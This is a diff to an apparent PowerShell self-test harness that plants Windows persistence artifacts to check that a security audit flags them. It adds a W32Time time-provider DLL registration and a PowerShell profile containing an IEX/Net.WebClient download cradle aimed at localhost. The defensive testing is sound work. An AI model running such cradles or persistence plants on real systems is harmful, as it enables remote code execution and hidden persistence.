@@ -58,6 +58,12 @@ $defExclPath = 'C:\dz_selftest_excl_dir'   # Defender exclusion planted for Sect
 $startupDir  = [Environment]::GetFolderPath('Startup')   # localized-safe
 $startupVbs  = Join-Path $startupDir ("{0}.vbs" -f $MARK)
 $appcertKey  = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls'
+$timeProvKey = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\$MARK"
+# The audit always launches PowerShell with -NoProfile, so planting a profile
+# cannot influence the audit itself -- it is inert test data on this runner.
+$psProfDir   = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'WindowsPowerShell'
+$psProfile   = Join-Path $psProfDir 'Microsoft.PowerShell_profile.ps1'
+$psProfMade  = $false
 # Logon/unlock persistence plants (Section 5, tools/logon_persistence.ps1)
 $notifyKey   = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\dz_selftest_evil'
 $npOrderKey  = 'HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order'
@@ -122,6 +128,29 @@ $cases = @(
         Plant  = { if (-not (Test-Path $appcertKey)) { New-Item -Path $appcertKey -Force | Out-Null }
                    Set-ItemProperty -Path $appcertKey -Name $MARK -Value 'C:\Windows\Temp\dz_selftest_evil.dll' -Force }
         Cleanup= { Remove-ItemProperty -Path $appcertKey -Name $MARK -EA SilentlyContinue }
+    },
+    @{
+        Name   = 'Time provider DLL registered -> flagged (T1547.003)'
+        Tier   = 'required'  # persistence_extra.ps1; W32Time loads these as SYSTEM
+        # Planting the subkey is inert: W32Time only loads providers when the
+        # service starts, and the harness never restarts it.
+        Expect = ('(?im)\[(WARNING|CRITICAL)\] Time provider [^\r\n]*{0}' -f $MARK)
+        Plant  = { New-Item -Path $timeProvKey -Force | Out-Null
+                   Set-ItemProperty -Path $timeProvKey -Name 'DllName' -Value 'C:\Windows\Temp\dz_selftest_evil.dll' -Force }
+        Cleanup= { Remove-Item -LiteralPath $timeProvKey -Recurse -Force -EA SilentlyContinue }
+    },
+    @{
+        Name   = 'PowerShell profile with a download cradle -> flagged (T1546.013)'
+        Tier   = 'required'  # persistence_extra.ps1; content is judged, not existence
+        Expect = '(?im)\[(WARNING|CRITICAL)\] PowerShell profile [^\r\n]*'
+        Plant  = { if (-not (Test-Path $psProfDir)) { New-Item -ItemType Directory -Path $psProfDir -Force | Out-Null }
+                   # Only plant when the user has no profile of their own, so a
+                   # real profile on a dev box is never overwritten by the test.
+                   if (-not (Test-Path -LiteralPath $psProfile)) {
+                       Set-Content -LiteralPath $psProfile -Value "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/$MARK')" -Encoding ASCII
+                       $script:psProfMade = $true
+                   } }
+        Cleanup= { if ($script:psProfMade) { Remove-Item -LiteralPath $psProfile -Force -EA SilentlyContinue } }
     },
     @{
         Name   = 'Guest account enabled -> WARNING'
